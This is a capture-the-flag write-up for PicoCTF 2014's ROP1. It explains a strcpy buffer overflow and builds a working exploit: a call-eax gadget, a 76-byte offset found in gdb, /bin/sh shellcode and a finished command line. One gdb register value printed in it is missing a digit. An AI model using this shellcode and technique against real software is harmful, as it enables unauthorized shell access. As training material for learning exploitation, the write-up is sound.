#ROP1

This is a challenge from PicoCTF 2014 on return oriented programming. We are given a vulnerable C code shown below.

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

void vuln(char *name){
    char buf[64];
    strcpy(buf, name);
}

int main(int argc, char **argv){
    be_nice_to_people();
    if(argc > 1)
        vuln(argv[1]);
    return 0;
}
```

#S#olution
What should come to our attention is the use of ```strcpy()``` function. This does not check for the length of the string we put in, so we are able to overwrite the content of the stack.
As the name of the challenge suggests, we are to implement ROP, and what we need here is so-called ROP-gadget that alters the value of the instruction pointer %eip 
in order to execute our shellcode.
Conveniently, the ```strcpy``` function returns the pointer to the string argument (=buf), and therefore, the value of %eax is exactly the address of buf in the stack.
What we can manipulate here is string %eax points to, so we want to set %eip to point to the address of %eax (by executing the instruction ```call %eax```). We can find such ROP-gadgets using objdump as well as grep
```
objdump -d rop1 | grep "call.*eax"
```
The first one in the list is ```8048d86```, so let's use this one.

Next, we need to figure out the distance between the address of %eax and the saved %eip in the stack. If we could overwrite this %eip to point to the instruction address of ROP-gadget,
we can set %eip to the address of %eax. On the server, we were equipped with gdb. Set a breakpoint at vuln() and run the program.
```
(gdb) b vuln
```
We can now check the address of saved eip in the stack.
```
(gdb) info frame
```
This should print something like the following (the address may differ)
```
Saved registers: 
 ebp at 0xffffd728, eip at 0xffffd72c
```
Ok, now let' see where %eax points to when it returns from ```strcpy()```
```
(gdb) info register eax
eax         0xfffd6e0
```
Take the difference, and this gives ```76```. This tells us that we should pass in a string of length 76 to fill the gap, which is followed by the 4 bytes giving the address of the ROP gadget we identified previously. 
Not over yet. The string we pass in must contain the shellcode we want to execute. Let's use this one for now
```
”\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh”
```
Note that this system is little-endian. So we had to reverse the order of the hex digit: this applies to the address of the ROP-gadget too. 
Finally, we just feed this to the program as follows 
```
./rop1 $(python -c 'print "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"+ "a"*38 + "\x86\x8d\x04\x08" ')
```
The flag is ```theres_no_need_to_guess```
